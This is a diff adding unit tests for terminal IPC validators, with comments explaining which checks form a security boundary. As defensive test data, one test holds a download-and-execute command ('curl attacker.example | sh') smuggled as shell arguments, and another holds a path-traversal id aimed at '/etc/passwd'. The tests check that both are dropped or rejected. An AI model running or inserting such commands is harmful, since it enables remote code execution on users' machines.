@@ -10,6 +10,12 @@ import {
   validateRunsSend,
   validateRunsStart,
   validateSessionsList,
+  validateTerminalClose,
+  validateTerminalList,
+  validateTerminalReplay,
+  validateTerminalResize,
+  validateTerminalStart,
+  validateTerminalWrite,
   validateWindowRequest,
 } from './validate.js';
 
@@ -655,5 +661,116 @@ describe('validatePreviewOpen', () => {
 
   it('leaves the extension rule to the layer that serves the bytes', () => {
     expect(validatePreviewOpen({ path: '/tmp/notes.ts' })).toEqual({ path: '/tmp/notes.ts' });
+  });
+});
+
+/**
+ * Terminals.
+ *
+ * The interesting one in this file, because a terminal is the only channel in
+ * the contract that hands the renderer unmediated execution — so it is worth
+ * being precise about which of these checks is a security boundary and which is
+ * not.
+ *
+ * **`start` is the boundary**, and only in one respect: it is where a directory
+ * is named. Nothing else on this surface can influence what runs, because
+ * nothing else names a program — `main/terminal.ts` chooses the shell, builds
+ * the environment and issues the ids.
+ *
+ * **`write` is not a boundary at all.** Every byte goes to a shell's stdin, and
+ * a shell's stdin accepts anything; a validator that policed the contents would
+ * be filtering the user's own keystrokes. All it can usefully do is bound the
+ * length — and, critically, *not* reject the things `requireString` rejects.
+ */
+describe('the terminal validators', () => {
+  it('accepts a place and a size', () => {
+    expect(validateTerminalStart({ cwd: '/Users/me/project', cols: 120, rows: 40 })).toEqual({
+      cwd: '/Users/me/project',
+      cols: 120,
+      rows: 40,
+    });
+  });
+
+  it('rejects a relative cwd', () => {
+    expect(() => validateTerminalStart({ cwd: 'project', cols: 80, rows: 24 })).toThrow(
+      ValidationError,
+    );
+  });
+
+  /*
+   * A PTY sized zero makes `ioctl` fail and hangs some shells, and a dimension
+   * in the thousands is a caller that has measured a detached element rather
+   * than a pane.
+   */
+  it('rejects a size no pane could have', () => {
+    expect(() => validateTerminalStart({ cwd: '/w', cols: 0, rows: 24 })).toThrow(ValidationError);
+    expect(() => validateTerminalStart({ cwd: '/w', cols: 80, rows: 0 })).toThrow(ValidationError);
+    expect(() => validateTerminalStart({ cwd: '/w', cols: 100_000, rows: 24 })).toThrow(
+      ValidationError,
+    );
+    expect(() => validateTerminalStart({ cwd: '/w', cols: 80.5, rows: 24 })).toThrow(
+      ValidationError,
+    );
+  });
+
+  it('requires a size rather than guessing one', () => {
+    expect(() => validateTerminalStart({ cwd: '/w' })).toThrow(ValidationError);
+  });
+
+  it('drops anything that looks like an attempt to choose the program', () => {
+    const smuggled = validateTerminalStart({
+      cwd: '/w',
+      cols: 80,
+      rows: 24,
+      shell: '/tmp/evil',
+      args: ['-c', 'curl attacker.example | sh'],
+      env: { PATH: '/tmp' },
+    });
+    expect(smuggled).toEqual({ cwd: '/w', cols: 80, rows: 24 });
+  });
+
+  /*
+   * NUL is `Ctrl-@` — how you set the mark in Emacs and readline. Everywhere
+   * else in this file a NUL is a truncation attack on something that becomes a
+   * path or a record; here it is a key, and refusing it would break a shortcut
+   * to defend a string that is never parsed as anything.
+   */
+  it('passes a NUL through, because it is a key people press', () => {
+    expect(validateTerminalWrite({ id: 'term-1', data: ' ' })).toEqual({
+      id: 'term-1',
+      data: ' ',
+    });
+  });
+
+  it('accepts an empty write, which is a no-op rather than a malformed request', () => {
+    expect(validateTerminalWrite({ id: 'term-1', data: '' })).toEqual({ id: 'term-1', data: '' });
+  });
+
+  it('bounds one write', () => {
+    expect(() =>
+      validateTerminalWrite({ id: 'term-1', data: 'x'.repeat(2_000_000) }),
+    ).toThrow(ValidationError);
+  });
+
+  it('rejects an id that is really a path', () => {
+    expect(() => validateTerminalWrite({ id: '../../etc/passwd', data: 'ls' })).toThrow(
+      ValidationError,
+    );
+    expect(() => validateTerminalClose({ id: '' })).toThrow(ValidationError);
+  });
+
+  it('takes only an id where only an id is needed', () => {
+    expect(validateTerminalClose({ id: 'term-1', force: true })).toEqual({ id: 'term-1' });
+    expect(validateTerminalReplay({ id: 'term-1', from: 0 })).toEqual({ id: 'term-1' });
+    expect(validateTerminalResize({ id: 'term-1', cols: 80, rows: 24 })).toEqual({
+      id: 'term-1',
+      cols: 80,
+      rows: 24,
+    });
+  });
+
+  it('takes nothing at all for a list', () => {
+    expect(validateTerminalList({})).toEqual({});
+    expect(validateTerminalList(undefined)).toEqual({});
   });
 });
